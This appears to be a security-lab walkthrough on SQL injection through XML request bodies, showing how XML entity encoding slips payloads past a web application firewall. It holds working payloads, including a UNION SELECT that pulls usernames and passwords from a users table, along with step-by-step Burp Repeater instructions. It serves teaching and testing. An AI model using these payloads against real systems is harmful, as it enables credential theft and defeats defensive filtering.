While it is normal to inject malicious SQL payloads on query strings, you can still perform SQL injection attacks on any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and uses it to query the database.

<!-- @TODO: Link Obfuscation from WAF Bypass -->
Using these different formats may provide ways to an attacker to obfuscate their payload that are blocked by web-application firewalls (WAF) or other defense mechanisms. For example, the following XML-based SQL Injection uses an XML escape sequence to encode the `S` character in `SELECT`:
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
## Example Exploit
1. Observe that the stock check feature sends the `productId` and `storeId` to the application in XML format.
2. Send the `POST /product/stock` request to Burp Repeater.
3. In Burp Repeater, probe the `storeId` to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example: `<storeId>1+1</storeId>`
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
5. Try determining the number of columns returned by the original query by appending a `UNION SELECT` statement to the original store ID: `<storeId>1 UNION SELECT NULL</storeId>`
6. Observe that your request has been blocked due to being flagged as a potential attack.
7. Using the [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) extension, highlight your input, right-click, then select **Extensions > Hackvertor > Encode > dec_entities/hex_entities**.
8. Notice that you can only return one column, so you need to concatenate the username and password using the following payload:
```xml
<storeId>
	<@hex_entities>
		1 UNION SELECT username || '~' || password FROM users
	<@/hex_entities>
</storeId>
```
9. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a `~` character.